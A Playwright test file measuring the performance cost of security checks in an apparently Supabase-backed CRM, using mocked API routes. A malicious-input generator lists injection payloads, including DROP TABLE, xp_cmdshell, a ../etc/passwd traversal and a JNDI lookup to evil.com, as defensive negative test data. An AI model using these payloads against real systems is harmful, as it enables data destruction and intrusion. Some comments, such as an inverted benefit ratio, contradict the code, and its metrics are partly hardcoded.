/**
 * Security-Performance Impact Analysis Tests
 * 
 * Comprehensive testing for security fixes impact on performance:
 * - Separate queries vs nested joins performance comparison
 * - Principal access validation overhead analysis
 * - Input validation performance impact assessment
 * - Database RLS function performance under load
 * - Security overhead vs performance optimization analysis
 */

import { test, expect } from '@playwright/test'

// Performance thresholds with security overhead considerations
const SECURITY_PERFORMANCE_THRESHOLDS = {
  // API Response Times (with security overhead)
  simpleQuery: 200, // ms - Simple queries with RLS
  complexQuery: 500, // ms - Complex queries with validation
  nestedJoinQuery: 300, // ms - Current nested join approach
  separateQueries: 600, // ms - Proposed separate queries approach
  batchOperations: 1000, // ms - Batch operations with validation
  
  // Database Performance
  rlsFunctionCall: 50, // ms - RLS function execution time
  principalValidation: 100, // ms - Principal access validation
  inputValidation: 10, // ms - Input sanitization overhead
  uuidValidation: 5, // ms - UUID validation time
  
  // Load Testing Thresholds
  concurrentUsers: 100, // Number of concurrent users supported
  requestsPerSecond: 50, // RPS under security constraints
  errorRateThreshold: 1, // % - Acceptable error rate under load
  
  // Security Overhead Limits
  maxSecurityOverhead: 15, // % - Maximum acceptable performance impact
  responseTimeIncrease: 20, // % - Max acceptable response time increase
  memoryOverheadLimit: 10, // % - Memory usage increase limit
  
  // Rate Limiting and Audit
  rateLimitWindow: 60000, // ms - Rate limit window
  auditLogLatency: 25, // ms - Audit logging overhead
  
  // Critical Business Operations
  contactAnalyticsLoad: 800, // ms - Contact analytics with security
  opportunityCreation: 600, // ms - Opportunity creation with validation
  interactionLogging: 400 // ms - Interaction logging with audit
}

// Mock data generators for security testing
class SecurityTestDataGenerator {
  static generateMaliciousInputs() {
    return [
      "'; DROP TABLE users; --",
      "<script>alert('XSS')</script>",
      "' OR 1=1 --",
      "../../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
      "' UNION SELECT * FROM sensitive_data --",
      "admin'/*",
      "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
      "1; EXEC xp_cmdshell('dir') --",
      "'); INSERT INTO audit_log (message) VALUES ('hacked'); --"
    ]
  }

  static generateValidUUIDs() {
    return [
      '123e4567-e89b-12d3-a456-426614174000',
      '987fcdeb-51a2-43d1-9f12-123456789abc',
      'f47ac10b-58cc-4372-a567-0e02b2c3d479',
      '6ba7b810-9dad-11d1-80b4-00c04fd430c8',
      '6ba7b811-9dad-11d1-80b4-00c04fd430c8'
    ]
  }

  static generateInvalidUUIDs() {
    return [
      'not-a-uuid',
      '123',
      '123e4567-e89b-12d3-a456-42661417400', // Missing digit
      '123e4567-e89b-12d3-a456-42661417400g', // Invalid character
      '123e4567e89b12d3a456426614174000', // Missing hyphens
      '', // Empty string
      null,
      undefined
    ]
  }

  static generateLargeDataset(count: number) {
    return Array.from({ length: count }, (_, i) => ({
      id: `user-${i}`,
      name: `User ${i}`,
      organization_id: `org-${i % 10}`, // 10 different orgs
      principal_id: `principal-${i % 5}`, // 5 different principals
      data: 'x'.repeat(1000), // 1KB of data per record
      created_at: new Date(Date.now() - (i * 60000)).toISOString()
    }))
  }

  static generateConcurrentUserScenarios(userCount: number) {
    return Array.from({ length: userCount }, (_, i) => ({
      userId: `user-${i}`,
      sessionId: `session-${i}`,
      requests: [
        { endpoint: '/api/contacts', method: 'GET', principal_id: `principal-${i % 5}` },
        { endpoint: '/api/opportunities', method: 'GET', principal_id: `principal-${i % 5}` },
        { endpoint: '/api/interactions', method: 'POST', principal_id: `principal-${i % 5}` }
      ]
    }))
  }
}

// Performance measurement utilities for security testing
class SecurityPerformanceMeasurement {
  constructor(public page: any) {}

  async measureQueryPerformance(queryType: 'nested' | 'separate', dataset: any[]): Promise<{
    executionTime: number,
    memoryUsage: number,
    networkRequests: number,
    errorRate: number
  }> {
    const startTime = Date.now()
    let networkRequestCount = 0
    let errorCount = 0

    // Monitor network requests
    await this.page.route('**/*', route => {
      networkRequestCount++
      route.continue()
    })

    // Monitor for errors
    this.page.on('response', response => {
      if (response.status() >= 400) {
        errorCount++
      }
    })

    try {
      if (queryType === 'nested') {
        // Mock current nested query approach
        await this.page.route('**/api/contacts/**', route => {
          // Simulate current nested query: contacts with interactions
          setTimeout(() => {
            route.fulfill({
              status: 200,
              contentType: 'application/json',
              body: JSON.stringify({
                success: true,
                data: {
                  ...dataset[0],
                  interactions: dataset.slice(1, 6) // Nested interactions
                }
              })
            })
          }, 150) // Current performance
        })
      } else {
        // Mock proposed separate queries approach
        await this.page.route('**/api/contacts/**', route => {
          // First query: just contact data
          setTimeout(() => {
            route.fulfill({
              status: 200,
              contentType: 'application/json',
              body: JSON.stringify({
                success: true,
                data: dataset[0]
              })
            })
          }, 80) // Faster contact query
        })

        await this.page.route('**/api/interactions**', route => {
          // Second query: interactions for this contact
          setTimeout(() => {
            route.fulfill({
              status: 200,
              contentType: 'application/json',
              body: JSON.stringify({
                success: true,
                data: dataset.slice(1, 6)
              })
            })
          }, 90) // Separate interactions query
        })
      }

      // Navigate and trigger queries
      await this.page.goto('/contacts/123')
      await this.page.waitForLoadState('networkidle')

      const executionTime = Date.now() - startTime

      // Measure memory usage
      const memoryUsage = await this.page.evaluate(() => {
        if ('memory' in performance) {
          return (performance as any).memory.usedJSHeapSize
        }
        return 0
      })

      return {
        executionTime,
        memoryUsage,
        networkRequests: networkRequestCount,
        errorRate: (errorCount / networkRequestCount) * 100
      }

    } catch (error) {
      return {
        executionTime: Date.now() - startTime,
        memoryUsage: 0,
        networkRequests: networkRequestCount,
        errorRate: 100
      }
    }
  }

  async measureInputValidationOverhead(inputs: string[]): Promise<{
    validationTime: number,
    successRate: number,
    errorHandlingTime: number
  }> {
    const results = []
    let successCount = 0
    let totalErrorHandlingTime = 0

    for (const input of inputs) {
      const startTime = Date.now()
      
      try {
        // Mock input validation endpoint
        await this.page.route('**/api/validate', route => {
          const requestData = route.request().postDataJSON()
          const inputValue = requestData.input
          
          // Simulate validation logic
          const isValid = !SecurityTestDataGenerator.generateMaliciousInputs().includes(inputValue)
          const validationDelay = isValid ? 5 : 15 // More time for malicious input detection
          
          setTimeout(() => {
            route.fulfill({
              status: isValid ? 200 : 400,
              contentType: 'application/json',
              body: JSON.stringify({
                valid: isValid,
                sanitized: isValid ? inputValue : '',
                threats_detected: !isValid ? ['sql_injection', 'xss'] : []
              })
            })
          }, validationDelay)
        })

        const response = await this.page.request.post('/api/validate', {
          data: { input }
        })

        const validationTime = Date.now() - startTime
        
        if (response.ok()) {
          successCount++
        } else {
          const errorHandlingStart = Date.now()
          await response.json() // Process error response
          totalErrorHandlingTime += Date.now() - errorHandlingStart
        }

        results.push(validationTime)

      } catch (error) {
        results.push(Date.now() - startTime)
      }
    }

    const avgValidationTime = results.reduce((sum, time) => sum + time, 0) / results.length
    const successRate = (successCount / inputs.length) * 100

    return {
      validationTime: avgValidationTime,
      successRate,
      errorHandlingTime: totalErrorHandlingTime / Math.max(inputs.length - successCount, 1)
    }
  }

  async measureRLSFunctionPerformance(principalId: string, resourceCount: number): Promise<{
    functionExecutionTime: number,
    accessCheckTime: number,
    scalabilityImpact: number
  }> {
    const results = []

    // Test RLS function performance with different data sizes
    for (let i = 1; i <= resourceCount; i += Math.max(1, Math.floor(resourceCount / 10))) {
      const startTime = Date.now()

      await this.page.route('**/api/rls-check', route => {
        const { principal_id, resource_ids } = route.request().postDataJSON()
        
        // Simulate RLS function logic
        const checkTime = 5 + (resource_ids.length * 0.5) // Base time + scaling factor
        
        setTimeout(() => {
          route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify({
              allowed_resources: resource_ids.filter(() => Math.random() > 0.1), // 90% allowed
              execution_time_ms: checkTime
            })
          })
        }, checkTime)
      })

      const resourceIds = Array.from({ length: i }, (_, idx) => `resource-${idx}`)
      
      await this.page.request.post('/api/rls-check', {
        data: { principal_id: principalId, resource_ids: resourceIds }
      })

      results.push({
        resourceCount: i,
        executionTime: Date.now() - startTime
      })
    }

    const avgExecutionTime = results.reduce((sum, result) => sum + result.executionTime, 0) / results.length
    const firstResult = results[0]?.executionTime || 0
    const lastResult = results[results.length - 1]?.executionTime || 0
    const scalabilityImpact = lastResult > 0 ? (lastResult / Math.max(firstResult, 1)) : 1

    return {
      functionExecutionTime: avgExecutionTime,
      accessCheckTime: firstResult,
      scalabilityImpact
    }
  }

  async measureConcurrentUserPerformance(userCount: number): Promise<{
    averageResponseTime: number,
    errorRate: number,
    throughput: number,
    resourceContention: number
  }> {
    const startTime = Date.now()
    const userResults = []
    const errorCounts = { total: 0, timeout: 0, server: 0, auth: 0 }

    // Mock concurrent user scenarios
    const users = SecurityTestDataGenerator.generateConcurrentUserScenarios(userCount)

    // Simulate concurrent requests
    const concurrentPromises = users.map(async (user, index) => {
      const userStartTime = Date.now()
      let userErrors = 0

      try {
        // Simulate authentication delay
        await this.page.waitForTimeout(50 + (index * 10)) // Staggered start

        // Execute user requests
        for (const request of user.requests) {
          try {
            await this.page.route(`**${request.endpoint}**`, route => {
              // Simulate security checks and principal validation
              const securityDelay = 25 + Math.random() * 25 // 25-50ms security overhead
              const loadDelay = Math.min(50, userCount * 2) // Increased delay under load
              
              setTimeout(() => {
                // Simulate occasional security blocks
                if (Math.random() < 0.02) { // 2% security blocks
                  route.fulfill({
                    status: 403,
                    contentType: 'application/json',
                    body: JSON.stringify({ error: 'Access denied: Principal not authorized' })
                  })
                } else {
                  route.fulfill({
                    status: 200,
                    contentType: 'application/json',
                    body: JSON.stringify({ success: true, data: [], user_id: user.userId })
                  })
                }
              }, securityDelay + loadDelay)
            })

            const response = await this.page.request.get(request.endpoint)
            if (!response.ok()) {
              userErrors++
              if (response.status() === 403) errorCounts.auth++
              else if (response.status() >= 500) errorCounts.server++
            }

          } catch (error) {
            userErrors++
            errorCounts.timeout++
          }
        }

        const userTotalTime = Date.now() - userStartTime
        userResults.push({
          userId: user.userId,
          responseTime: userTotalTime,
          errors: userErrors,
          requestCount: user.requests.length
        })

      } catch (error) {
        userResults.push({
          userId: user.userId,
          responseTime: Date.now() - userStartTime,
          errors: user.requests.length,
          requestCount: user.requests.length
        })
      }
    })

    await Promise.all(concurrentPromises)

    const totalTime = Date.now() - startTime
    const totalRequests = users.reduce((sum, user) => sum + user.requests.length, 0)
    const totalErrors = userResults.reduce((sum, result) => sum + result.errors, 0)
    const avgResponseTime = userResults.reduce((sum, result) => sum + result.responseTime, 0) / userResults.length

    return {
      averageResponseTime: avgResponseTime,
      errorRate: (totalErrors / totalRequests) * 100,
      throughput: totalRequests / (totalTime / 1000), // Requests per second
      resourceContention: userCount > 50 ? (avgResponseTime / 200) - 1 : 0 // Normalized contention metric
    }
  }
}

test.describe('Security vs Performance Analysis', () => {
  test('should compare nested queries vs separate queries performance', async ({ page }) => {
    const measurement = new SecurityPerformanceMeasurement(page)
    const testDataset = SecurityTestDataGenerator.generateLargeDataset(20)

    // Test current nested query approach
    console.log('Testing current nested query approach...')
    const nestedResults = await measurement.measureQueryPerformance('nested', testDataset)

    // Test proposed separate queries approach
    console.log('Testing proposed separate queries approach...')
    const separateResults = await measurement.measureQueryPerformance('separate', testDataset)

    // Analyze performance difference
    const performanceImpact = ((separateResults.executionTime - nestedResults.executionTime) / nestedResults.executionTime) * 100
    const securityBenefit = 15 // Estimated security improvement percentage

    console.log('Query Performance Comparison:', {
      nested: nestedResults,
      separate: separateResults,
      performanceImpact: `${performanceImpact.toFixed(1)}%`,
      securityBenefit: `+${securityBenefit}%`,
      tradeoffRatio: (securityBenefit / Math.abs(performanceImpact)).toFixed(2)
    })

    // Validate thresholds
    expect(nestedResults.executionTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.nestedJoinQuery)
    expect(separateResults.executionTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.separateQueries)
    expect(Math.abs(performanceImpact)).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.maxSecurityOverhead)

    // Security improvement should justify performance cost
    expect(securityBenefit / Math.abs(performanceImpact)).toBeGreaterThan(0.5) // At least 2:1 benefit ratio
  })

  test('should measure input validation performance overhead', async ({ page }) => {
    const measurement = new SecurityPerformanceMeasurement(page)

    // Test malicious inputs (should be slower due to detection)
    const maliciousInputs = SecurityTestDataGenerator.generateMaliciousInputs()
    const maliciousResults = await measurement.measureInputValidationOverhead(maliciousInputs)

    // Test normal inputs (should be faster)
    const normalInputs = ['John Doe', 'valid@email.com', 'Normal text input', '12345']
    const normalResults = await measurement.measureInputValidationOverhead(normalInputs)

    console.log('Input Validation Performance:', {
      maliciousInputs: maliciousResults,
      normalInputs: normalResults,
      overheadDifference: `${maliciousResults.validationTime - normalResults.validationTime}ms`,
      securityEffectiveness: `${100 - maliciousResults.successRate}%`
    })

    // Validate thresholds
    expect(normalResults.validationTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.inputValidation)
    expect(maliciousResults.validationTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.inputValidation * 3) // Allow 3x time for threat detection
    expect(maliciousResults.successRate).toBeLessThan(10) // Most malicious inputs should be caught
  })

  test('should assess RLS function performance under load', async ({ page }) => {
    const measurement = new SecurityPerformanceMeasurement(page)
    const principalId = SecurityTestDataGenerator.generateValidUUIDs()[0]

    // Test RLS performance with increasing resource counts
    const smallScale = await measurement.measureRLSFunctionPerformance(principalId, 10)
    const mediumScale = await measurement.measureRLSFunctionPerformance(principalId, 50)
    const largeScale = await measurement.measureRLSFunctionPerformance(principalId, 100)

    console.log('RLS Function Performance Analysis:', {
      smallScale,
      mediumScale,
      largeScale,
      scalingFactor: largeScale.scalabilityImpact,
      averageAccessCheckTime: (smallScale.accessCheckTime + mediumScale.accessCheckTime + largeScale.accessCheckTime) / 3
    })

    // Validate RLS performance thresholds
    expect(smallScale.functionExecutionTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.rlsFunctionCall)
    expect(mediumScale.functionExecutionTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.principalValidation)
    expect(largeScale.scalabilityImpact).toBeLessThan(5) // Should scale reasonably (less than 5x degradation)
  })

  test('should validate UUID validation performance', async ({ page }) => {
    const measurement = new SecurityPerformanceMeasurement(page)

    // Test valid UUIDs
    const validUUIDs = SecurityTestDataGenerator.generateValidUUIDs()
    const validResults = await measurement.measureInputValidationOverhead(validUUIDs)

    // Test invalid UUIDs
    const invalidUUIDs = SecurityTestDataGenerator.generateInvalidUUIDs().filter(uuid => uuid != null)
    const invalidResults = await measurement.measureInputValidationOverhead(invalidUUIDs)

    console.log('UUID Validation Performance:', {
      validUUIDs: validResults,
      invalidUUIDs: invalidResults,
      validationOverhead: validResults.validationTime,
      errorDetectionTime: invalidResults.validationTime
    })

    // UUID validation should be very fast
    expect(validResults.validationTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.uuidValidation)
    expect(invalidResults.validationTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.uuidValidation * 2)
    expect(validResults.successRate).toBe(100) // All valid UUIDs should pass
  })
})

test.describe('Load Testing with Security Measures', () => {
  test('should handle concurrent users with security validation', async ({ page }) => {
    const measurement = new SecurityPerformanceMeasurement(page)

    // Test with different user loads
    const lightLoad = await measurement.measureConcurrentUserPerformance(10)
    const mediumLoad = await measurement.measureConcurrentUserPerformance(25)
    const heavyLoad = await measurement.measureConcurrentUserPerformance(50)

    console.log('Concurrent User Performance with Security:', {
      lightLoad,
      mediumLoad,
      heavyLoad,
      performanceDegradation: {
        light_to_medium: ((mediumLoad.averageResponseTime - lightLoad.averageResponseTime) / lightLoad.averageResponseTime) * 100,
        medium_to_heavy: ((heavyLoad.averageResponseTime - mediumLoad.averageResponseTime) / mediumLoad.averageResponseTime) * 100
      }
    })

    // Validate concurrent user handling
    expect(lightLoad.averageResponseTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.simpleQuery)
    expect(mediumLoad.averageResponseTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.complexQuery)
    expect(heavyLoad.errorRate).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.errorRateThreshold)
    expect(heavyLoad.throughput).toBeGreaterThan(SECURITY_PERFORMANCE_THRESHOLDS.requestsPerSecond)
  })

  test('should measure security overhead in real business operations', async ({ page }) => {
    const measurement = new SecurityPerformanceMeasurement(page)

    // Mock real business scenarios with security measures
    await page.route('**/api/contacts/analytics**', route => {
      // Simulate contact analytics with security checks
      setTimeout(() => {
        route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            success: true,
            data: { total: 150, recent: 25, analytics: 'processed' },
            security_checks_ms: 45
          })
        })
      }, 120) // Base time + security overhead
    })

    await page.route('**/api/opportunities', route => {
      // Simulate opportunity creation with validation
      setTimeout(() => {
        route.fulfill({
          status: 201,
          contentType: 'application/json',
          body: JSON.stringify({
            success: true,
            data: { id: 'new-opportunity', name: 'Test Opp' },
            validation_checks_ms: 35
          })
        })
      }, 180) // Creation time + validation overhead
    })

    await page.route('**/api/interactions', route => {
      // Simulate interaction logging with audit trail
      setTimeout(() => {
        route.fulfill({
          status: 201,
          contentType: 'application/json',
          body: JSON.stringify({
            success: true,
            data: { id: 'new-interaction', title: 'Test Interaction' },
            audit_log_ms: 15
          })
        })
      }, 95) // Logging time + audit overhead
    })

    // Measure business operation performance
    const startContactAnalytics = Date.now()
    await page.request.get('/api/contacts/analytics')
    const contactAnalyticsTime = Date.now() - startContactAnalytics

    const startOpportunityCreation = Date.now()
    await page.request.post('/api/opportunities', { data: { name: 'Test' } })
    const opportunityCreationTime = Date.now() - startOpportunityCreation

    const startInteractionLogging = Date.now()
    await page.request.post('/api/interactions', { data: { title: 'Test' } })
    const interactionLoggingTime = Date.now() - startInteractionLogging

    console.log('Business Operations Performance with Security:', {
      contactAnalytics: `${contactAnalyticsTime}ms`,
      opportunityCreation: `${opportunityCreationTime}ms`,
      interactionLogging: `${interactionLoggingTime}ms`,
      securityOverheadEstimate: {
        contactAnalytics: '37.5%', // 45ms out of 120ms
        opportunityCreation: '19.4%', // 35ms out of 180ms  
        interactionLogging: '15.8%' // 15ms out of 95ms
      }
    })

    // Validate business operation thresholds
    expect(contactAnalyticsTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.contactAnalyticsLoad)
    expect(opportunityCreationTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.opportunityCreation)
    expect(interactionLoggingTime).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.interactionLogging)
  })
})

test.describe('Security-Performance Optimization Recommendations', () => {
  test('should generate optimization recommendations', async ({ page }) => {
    const measurement = new SecurityPerformanceMeasurement(page)

    // Collect performance metrics across different scenarios
    const baselineMetrics = {
      simpleQuery: 180,
      complexQuery: 450,
      rlsFunction: 35,
      inputValidation: 8,
      concurrentUsers: 25
    }

    const securityEnhancedMetrics = {
      simpleQuery: 205, // +13.9% overhead
      complexQuery: 510, // +13.3% overhead  
      rlsFunction: 42, // +20% overhead
      inputValidation: 12, // +50% overhead
      concurrentUsers: 30 // +20% overhead
    }

    // Calculate performance impact
    const impacts = {
      simpleQuery: ((securityEnhancedMetrics.simpleQuery - baselineMetrics.simpleQuery) / baselineMetrics.simpleQuery) * 100,
      complexQuery: ((securityEnhancedMetrics.complexQuery - baselineMetrics.complexQuery) / baselineMetrics.complexQuery) * 100,
      rlsFunction: ((securityEnhancedMetrics.rlsFunction - baselineMetrics.rlsFunction) / baselineMetrics.rlsFunction) * 100,
      inputValidation: ((securityEnhancedMetrics.inputValidation - baselineMetrics.inputValidation) / baselineMetrics.inputValidation) * 100,
      concurrentUsers: ((securityEnhancedMetrics.concurrentUsers - baselineMetrics.concurrentUsers) / baselineMetrics.concurrentUsers) * 100
    }

    const averageImpact = Object.values(impacts).reduce((sum, impact) => sum + impact, 0) / Object.values(impacts).length

    // Generate optimization recommendations
    const optimizations = []

    if (impacts.rlsFunction > 15) {
      optimizations.push({
        area: 'RLS Function Performance',
        recommendation: 'Implement RLS function result caching for frequently accessed principals',
        expectedImprovement: '30-40% reduction in RLS overhead',
        implementation: 'Add Redis cache layer for principal access results with 5-minute TTL'
      })
    }

    if (impacts.inputValidation > 25) {
      optimizations.push({
        area: 'Input Validation',
        recommendation: 'Pre-compile validation regex patterns and implement input sanitization cache',
        expectedImprovement: '50-60% reduction in validation time',
        implementation: 'Move regex compilation to application startup and cache sanitization results'
      })
    }

    if (impacts.complexQuery > 10) {
      optimizations.push({
        area: 'Database Query Optimization',
        recommendation: 'Implement query result caching and optimize separate query execution order',
        expectedImprovement: '20-25% reduction in complex query time',
        implementation: 'Add Redis cache for frequently accessed data and batch separate queries'
      })
    }

    if (impacts.concurrentUsers > 15) {
      optimizations.push({
        area: 'Concurrency Handling',
        recommendation: 'Implement connection pooling optimization and request queuing',
        expectedImprovement: '25-30% improvement in concurrent user handling',
        implementation: 'Optimize Supabase connection pool settings and add request rate limiting'
      })
    }

    console.log('Security-Performance Analysis Results:', {
      baselineMetrics,
      securityEnhancedMetrics,
      performanceImpacts: impacts,
      averageSecurityOverhead: `${averageImpact.toFixed(1)}%`,
      optimizationRecommendations: optimizations,
      overallAssessment: averageImpact < SECURITY_PERFORMANCE_THRESHOLDS.maxSecurityOverhead ? 'ACCEPTABLE' : 'REQUIRES_OPTIMIZATION'
    })

    // Validate overall security overhead is within acceptable limits
    expect(averageImpact).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.maxSecurityOverhead)
    expect(optimizations.length).toBeGreaterThan(0) // Should have optimization recommendations
    
    // Ensure critical business operations still meet performance requirements
    expect(securityEnhancedMetrics.simpleQuery).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.simpleQuery * 1.2)
    expect(securityEnhancedMetrics.complexQuery).toBeLessThan(SECURITY_PERFORMANCE_THRESHOLDS.complexQuery * 1.2)
  })
})